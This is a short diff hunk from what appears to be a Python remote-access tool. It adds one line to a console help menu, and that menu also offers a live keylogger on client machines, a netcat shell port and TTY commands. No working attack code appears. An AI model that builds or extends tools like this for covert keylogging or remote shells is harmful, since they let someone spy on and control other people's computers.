@@ -543,6 +543,7 @@ def client_console(client): #previously took in cmd
                     \n\tUse 'keylogger' to start a live keylog of the clients machine.\
                     \n\tUse 'ncport' to get the port the shell is listening on.\
                     \n\tUse 'setnick' to set the nickname of the machine.\
+                    \n\tUse 'ENDCONNECTION' in shell to end the connection.\
                     \n\tUse 'tty' to start a new TTY in netcat.\n")
             elif "exit" in newCMD:
                 break
